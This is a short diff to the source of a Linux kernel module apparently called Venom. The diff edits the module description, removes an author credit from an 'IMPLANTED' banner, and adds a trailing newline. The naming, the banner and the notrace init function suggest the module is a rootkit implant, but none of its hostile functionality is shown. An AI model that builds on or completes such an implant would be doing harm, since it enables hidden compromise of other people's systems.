@@ -15,7 +15,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
-MODULE_DESCRIPTION("Advance LKM");
+MODULE_DESCRIPTION("Advance LKM: ");
 MODULE_VERSION("4.0");
 
 
@@ -112,7 +112,7 @@ notrace static int __init venom_init(void) {
     printk(KERN_INFO "=============================================================================\n");
     printk(KERN_INFO "=                                                                           =\n");
     printk(KERN_INFO "=                          [ VENOM IMPLANTED ]                              =\n");
-    printk(KERN_INFO "=                          Made by Trevohack & Devil0x1                     =\n");
+    printk(KERN_INFO "=                                                                           =\n");
     printk(KERN_INFO "=                                                                           =\n");
     printk(KERN_INFO "=============================================================================\n"); 
 
@@ -133,3 +133,4 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
